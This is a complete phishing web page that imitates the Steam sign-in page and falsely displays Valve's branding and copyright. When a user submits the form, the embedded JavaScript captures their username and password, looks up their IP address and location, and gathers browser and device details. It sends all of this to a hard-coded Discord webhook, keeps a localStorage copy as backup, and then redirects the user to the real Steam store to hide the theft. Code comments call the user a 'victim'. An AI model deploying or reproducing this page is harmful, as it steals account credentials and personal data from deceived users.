<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Steam</title>
    <style>
        /* COMPLETE CSS EMBEDDED */
        body {
            background: #1b2838;
            font-family: Arial, sans-serif;
            color: #c6d4df;
            margin: 0;
            padding: 0;
        }
        
        .header {
            background: #171a21;
            height: 60px;
            padding: 0 30px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #2a475e;
        }
        
        .logo {
            width: 176px;
            height: 44px;
            background: #b8b6b4;
            border-radius: 3px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #171a21;
            font-size: 24px;
        }
        
        .nav {
            margin-left: auto;
            display: flex;
            gap: 20px;
        }
        
        .nav-link {
            color: #b8b6b4;
            text-decoration: none;
            font-size: 14px;
        }
        
        .login-container {
            max-width: 940px;
            margin: 40px auto;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 4px;
            padding: 40px;
        }
        
        .login-title {
            color: #fff;
            font-size: 32px;
            margin-bottom: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .label {
            color: #1999ff;
            font-size: 12px;
            margin-bottom: 8px;
        }
        
        .input {
            width: 100%;
            padding: 12px;
            background: #32353c;
            border: 1px solid #32353c;
            border-radius: 2px;
            color: #fff;
        }
        
        .login-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(90deg, #06BFFF 0%, #2D73FF 100%);
            color: white;
            border: none;
            border-radius: 2px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        
        .footer {
            background: #171a21;
            padding: 30px;
            margin-top: 60px;
        }
        
        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(23, 26, 33, 0.95);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #66c0f4;
            border-top: 4px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">STEAM</div>
        <div class="nav">
            <a href="#" class="nav-link">STORE</a>
            <a href="#" class="nav-link">COMMUNITY</a>
            <a href="#" class="nav-link">ABOUT</a>
            <a href="#" class="nav-link">SUPPORT</a>
            <a href="#" class="nav-link">SIGN IN</a>
            <a href="#" class="nav-link">LANGUAGE</a>
        </div>
    </div>

    <div class="login-container">
        <h1 class="login-title">Sign in</h1>
        
        <form id="loginForm">
            <div class="form-group">
                <label class="label">Account Name</label>
                <input type="text" class="input" id="username" placeholder="Enter your Steam account name" required>
            </div>
            
            <div class="form-group">
                <label class="label">Password</label>
                <input type="password" class="input" id="password" placeholder="Enter your password" required>
            </div>
            
            <button type="submit" class="login-btn" id="submitBtn">Sign in</button>
        </form>
    </div>

    <div class="footer">
        <div style="color: #8f98a0; font-size: 12px;">
            © Valve Corporation. All rights reserved.
        </div>
    </div>

    <div class="loading" id="loading">
        <div class="spinner"></div>
        <div style="color: #66c0f4; font-size: 20px; margin-top: 20px;">Signing in...</div>
    </div>

    <!-- WORKING DISCORD WEBHOOK CODE -->
    <script>
        // YOUR DISCORD WEBHOOK URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481029059289944177/lcGhidPjsc8KdFfYb_5khbIRB8SCVOE3nmFU_Lsxt7Ulh_-jr9Gs2F8PFHamPC1jjPjN";
        
        // Function to get victim IP address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Unknown';
            }
        }
        
        // Function to get location from IP
        async function getLocation(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return `${data.city || ''}, ${data.country_name || ''}`;
            } catch {
                return 'Unknown';
            }
        }
        
        // Function to collect ALL victim information
        async function collectVictimInfo() {
            const ip = await getIP();
            const location = await getLocation(ip);
            
            return {
                ip: ip,
                location: location,
                browser: navigator.userAgent,
                os: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                cookies: navigator.cookieEnabled,
                referrer: document.referrer || 'Direct',
                timestamp: new Date().toISOString()
            };
        }
        
        // Function to send credentials to Discord
        async function sendToDiscord(username, password, victimInfo) {
            const embed = {
                title: "🎮 STEAM LOGIN CAPTURED",
                description: "New victim credentials captured",
                color: 16711680, // Red color
                fields: [
                    {
                        name: "👤 Username",
                        value: username,
                        inline: true
                    },
                    {
                        name: "🔑 Password",
                        value: password,
                        inline: true
                    },
                    {
                        name: "📍 IP Address",
                        value: victimInfo.ip,
                        inline: true
                    },
                    {
                        name: "🌍 Location",
                        value: victimInfo.location,
                        inline: true
                    },
                    {
                        name: "🕒 Time",
                        value: new Date().toLocaleString(),
                        inline: true
                    },
                    {
                        name: "🖥️ Browser",
                        value: victimInfo.browser,
                        inline: true
                    },
                    {
                        name: "💻 OS",
                        value: victimInfo.os,
                        inline: true
                    },
                    {
                        name: "📱 Device",
                        value: screen.width > 768 ? "Desktop" : "Mobile",
                        inline: true
                    },
                    {
                        name: "📏 Screen",
                        value: victimInfo.screen,
                        inline: true
                    },
                    {
                        name: "🗺️ Timezone",
                        value: victimInfo.timezone,
                        inline: true
                    },
                    {
                        name: "🗣️ Language",
                        value: victimInfo.language,
                        inline: true
                    },
                    {
                        name: "🔗 Referrer",
                        value: victimInfo.referrer,
                        inline: true
                    }
                ],
                footer: {
                    text: "Steam Phishing Logger"
                },
                timestamp: victimInfo.timestamp
            };
            
            try {
                // Send to Discord webhook
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: "@everyone **🚨 NEW STEAM LOGIN CAPTURED!**",
                        embeds: [embed]
                    })
                });
                
                if (response.ok) {
                    console.log('✅ Credentials sent to Discord');
                    return true;
                } else {
                    console.log('❌ Discord response error:', response.status);
                    return false;
                }
            } catch (error) {
                console.log('❌ Discord fetch error:', error);
                return false;
            }
        }
        
        // Form submission handler
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!username || !password) {
                alert('Please enter both username and password');
                return;
            }
            
            // Show loading screen
            document.getElementById('loading').style.display = 'flex';
            
            // Disable button
            document.getElementById('submitBtn').disabled = true;
            document.getElementById('submitBtn').textContent = 'Signing in...';
            
            try {
                // Collect victim information
                const victimInfo = await collectVictimInfo();
                
                // Send credentials to Discord
                const success = await sendToDiscord(username, password, victimInfo);
                
                if (success) {
                    console.log('✅ All data successfully sent to Discord');
                } else {
                    console.log('⚠️ Discord failed, saving to localStorage');
                    
                    // Backup to localStorage
                    const backupData = {
                        username: username,
                        password: password,
                        victimInfo: victimInfo,
                        timestamp: new Date().toISOString()
                    };
                    
                    const existingLogs = JSON.parse(localStorage.getItem('steam_logs') || '[]');
                    existingLogs.push(backupData);
                    localStorage.setItem('steam_logs', JSON.stringify(existingLogs));
                }
                
                // Wait 3 seconds then redirect to real Steam
                setTimeout(() => {
                    window.location.href = 'https://store.steampowered.com';
                }, 3000);
                
            } catch (error) {
                console.error('❌ Error:', error);
                
                // Still redirect after error
                setTimeout(() => {
                    window.location.href = 'https://store.steampowered.com';
                }, 3000);
            }
        });
        
        // Make all links redirect to Steam
        document.querySelectorAll('a').forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                window.open('https://store.steampowered.com', '_blank');
            });
        });
        
        console.log('✅ Steam phishing page ready');
        console.log('✅ Discord webhook:', WEBHOOK_URL);
    </script>
</body>
</html>
